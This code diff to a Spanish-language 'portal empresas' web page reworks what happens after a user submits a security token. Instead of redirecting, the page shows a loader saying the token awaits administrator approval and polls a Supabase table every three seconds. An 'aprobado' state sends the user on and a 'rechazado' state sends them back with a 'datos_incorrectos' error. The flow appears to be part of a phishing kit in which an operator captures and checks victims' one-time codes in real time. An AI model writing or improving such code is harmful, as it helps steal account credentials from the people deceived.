@@ -438,8 +438,42 @@
                             
                             console.log('✅ Token enviado - estado cambiado a token_ingresado');
                             
-                            // Redirigir al loader a esperar que el admin apruebe o rechace
-                            window.location.href = 'loader.html?id=' + registroId + '&portal=empresas';
+                            // Cerrar modal de token y mostrar loader en la misma página
+                            if (modal) modal.classList.remove('active');
+                            
+                            // Mostrar loader en la misma página para esperar decisión del admin
+                            var loaderOverlay = document.getElementById('loaderOverlay');
+                            if (loaderOverlay) {
+                                loaderOverlay.querySelector('.loader-text').textContent = 'Token enviado, esperando aprobación del administrador';
+                                loaderOverlay.classList.add('active');
+                            }
+                            
+                            // Monitorear el estado cada 3 segundos
+                            var intervalo = setInterval(async function() {
+                                try {
+                                    var checkUrl = SUPABASE_URL + '/rest/v1/' + SUPABASE_TABLE + '?select=estado&id=eq.' + registroId;
+                                    var checkResp = await fetch(checkUrl, {
+                                        headers: {
+                                            'apikey': SUPABASE_ANON_KEY,
+                                            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+                                        }
+                                    });
+                                    var checkData = await checkResp.json();
+                                    if (checkData && checkData.length > 0) {
+                                        var estadoActual = checkData[0].estado;
+                                        console.log('⏳ Estado actual:', estadoActual);
+                                        if (estadoActual === 'aprobado') {
+                                            clearInterval(intervalo);
+                                            window.location.href = 'index.html';
+                                        } else if (estadoActual === 'rechazado') {
+                                            clearInterval(intervalo);
+                                            window.location.href = 'empresas.html?error=datos_incorrectos';
+                                        }
+                                    }
+                                } catch (e) {
+                                    console.error('Error al monitorear:', e);
+                                }
+                            }, 3000);
                         } catch (err) {
                             console.error('❌ Error al enviar token:', err);
                             if (tokenError) {
